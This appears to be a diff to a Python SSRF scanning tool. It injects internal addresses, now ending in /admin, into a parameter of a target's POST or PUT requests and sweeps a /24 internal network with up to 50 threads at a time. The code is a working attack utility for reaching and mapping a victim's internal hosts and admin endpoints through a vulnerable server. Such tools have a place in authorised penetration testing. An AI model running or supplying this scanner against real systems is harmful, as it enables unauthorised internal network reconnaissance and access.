@@ -7,7 +7,7 @@ def scanNet(request_info, params, network, port, url):
         if method == "POST" or method == "PUT":
             body_data = body.copy()
             if params in body_data:
-                body_data[params] = f"http://{network}:{port}"
+                body_data[params] = f"http://{network}:{port}/admin"
             if is_json:
                 response = requests.request(method, url, headers=header, json=body_data, timeout=3)
             else:
@@ -36,12 +36,17 @@ def scanNet(request_info, params, network, port, url):
 def run(request_info, params,  url):
     network_target = input("Network to scan (e.g., 192.168.1): ").strip()
     port = int(input("Port (default 80): ").strip() or "80")
-    networks = [i for i in range(0, 256)]
+    networks = [i for i in range(0, 255)]
     threads = []
+    max_threads = 50
     for network in networks:
         network_sc = f"{network_target}.{network}"
         t = Thread(target=scanNet, args=(request_info, params, network_sc, port, url))
         threads.append(t)
         t.start()
-    for t in threads:
-        t.join()
+        if len(threads) >= max_threads:
+            for jt in threads:
+                jt.join()
+            threads = []
+    for jt in threads:
+        jt.join()
